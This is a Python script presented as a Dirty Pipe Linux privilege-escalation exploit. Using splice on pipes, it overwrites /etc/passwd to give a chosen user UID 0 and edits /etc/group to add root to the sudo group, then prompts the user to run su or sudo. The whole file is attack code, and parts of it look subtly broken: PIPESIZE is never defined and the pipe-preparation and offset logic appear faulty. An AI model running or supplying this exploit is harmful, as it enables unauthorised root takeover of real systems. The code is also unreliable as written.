import os

def backup_file(path, backup_path):
    """Back up a file for recovery purposes."""
    with open(path, 'rb') as orig_file:
        with open(backup_path, 'wb') as backup:
            backup.write(orig_file.read())

def prepare_pipe(read_fd, write_fd):
    """Prepare the pipe by contaminating its flags."""
    data = b'a' * PIPESIZE
    os.write(write_fd, data)
    os.read(read_fd, PIPESIZE)

def run_poc(data, path, file_offset):
    """Perform the exploit by writing into the targeted file."""
    try:
        target_file = os.open(path, os.O_RDONLY)
        read_fd, write_fd = os.pipe()

        prepare_pipe(read_fd, write_fd)

        os.splice(target_file, file_offset, write_fd, None, 1)
        os.write(write_fd, data)

        os.close(target_file)
        os.close(read_fd)
        os.close(write_fd)
    except Exception as e:
        print(f"Error running PoC: {e}")

def find_offset_of_user_in_passwd(user):
    """Find the byte offset for a user's entry in /etc/passwd."""
    file_offset = 0
    modified_entry = ''
    original_entry = ''

    with open('/etc/passwd', 'r') as passwd_file:
        for line in passwd_file:
            if user in line:
                fields = line.split(':')
                file_offset += len(':'.join(fields[:1]))  # Up to the username
                original_entry = ':'.join(fields[1:])  # Save original data
                modified_entry = f":0:{fields[2]}:{fields[3]}" + ':'.join(fields[4:])
                break
            else:
                file_offset += len(line)
    return file_offset, modified_entry, original_entry

def find_offset_of_sudo_in_group():
    """Find the offset for the 'sudo' group entry in /etc/group."""
    file_offset = 0
    modified_entry = ''
    original_entry = ''

    with open('/etc/group', 'r') as group_file:
        for line in group_file:
            if line.startswith("sudo:"):
                fields = line.strip().split(':')
                original_entry = line.strip()
                if len(fields) > 3:
                    users = fields[3].split(',')
                    users.append('root')  # Add root to the sudo group
                    modified_entry = ':'.join(fields[:3]) + ':' + ','.join(users)
                else:
                    modified_entry = line.strip() + ',root'
                break
            file_offset += len(line)
    return file_offset, modified_entry, original_entry

def exploit(target_user, backup_passwd=True):
    """Run the Dirty Pipe exploit to escalate privileges."""
    passwd_file = '/etc/passwd'
    group_file = '/etc/group'
    backup_passwd_file = '/tmp/passwd.bak'
    backup_group_file = '/tmp/group.bak'

    if backup_passwd:
        backup_file(passwd_file, backup_passwd_file)
        backup_file(group_file, backup_group_file)

    # Find offsets and prepare data for /etc/passwd
    passwd_offset, passwd_to_write, original_passwd = find_offset_of_user_in_passwd(target_user)
    run_poc(passwd_to_write.encode(), passwd_file, passwd_offset)

    # Find offsets and prepare data for /etc/group
    group_offset, group_to_write, original_group = find_offset_of_sudo_in_group()
    run_poc(group_to_write.encode(), group_file, group_offset)

    print(f"Exploit completed. Backups saved at {backup_passwd_file} and {backup_group_file}.")
    print("You may now run `su` or use sudo.")

if __name__ == "__main__":
    TARGET_USER = "root"  # Adjust the username as needed
    exploit(TARGET_USER)
